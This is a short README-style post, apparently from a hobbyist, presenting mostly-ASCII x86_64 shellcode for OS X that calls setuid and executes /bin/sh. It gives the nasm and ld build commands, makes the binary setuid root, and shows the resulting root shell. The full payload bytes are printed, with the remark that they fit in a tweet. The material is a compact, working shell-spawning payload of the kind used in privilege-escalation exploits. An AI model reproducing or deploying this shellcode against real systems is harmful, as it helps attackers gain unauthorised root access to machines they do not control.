(mostly) ASCII setuid/shell code
===============================
### for OS X (x86_64)

i hesitate to call this shell code because i haven't tested it in that way.
all i know is, it works when compiled like this:

```shell
$ nasm -f macho64 ascii.asm && ld ascii.o -o ascii \
&& sudo chown root:wheel ascii && sudo chmod 4755 ascii && ./ascii

ld: warning: -macosx_version_min not specified, assuming 10.10
bash-3.2# whoami
root
```

btw, this is it, with the chars i couldn't remove, escaped like \xAA:

`h>>>>h ;) XH5 ;) PZXH5)>><\x0f\x05hAAAAXH5zAACH\xbfj/bin/shH\xc1\xef\x08WT_RT^\x0f\x05`

it fits in a tweet!

made without love by @reptar_xl
